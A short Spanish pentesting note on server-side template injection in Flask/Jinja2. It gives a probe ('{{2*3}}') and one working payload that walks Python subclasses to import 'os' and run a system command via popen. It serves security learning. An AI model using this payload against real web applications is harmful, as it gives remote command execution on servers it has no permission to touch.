---
title: ssti
author: naibu3
type: web
---

#web 

# ssti

*Server Side Template Injection* ó *ssti* es una vulnerabilidad de aplicaciones web que emplean plantillas para mostrar contenido dinámico, como podría ser *jinja2* de [[flask 1]].

## flask-python3

Las aplicaciones con *flask/jinja2*, pueden ser vulnerables a *ssti*, para comprobarlo podemos probar con un payload como `{{2*3}}`, si la página renderiza un `6`, sabremos que dicho *payload* se ejecuta como código [[python 1]], permitiéndonos *ejecución remota de comandos* ([[RCE]]).

A continuación algunos payloads (mirate también [hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)):

```python3
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}

```
> Este payload trata de acceder al módulo `warning` para poder importar la librería `os` y ejecutar comandos del sistema (en este caso `ls`)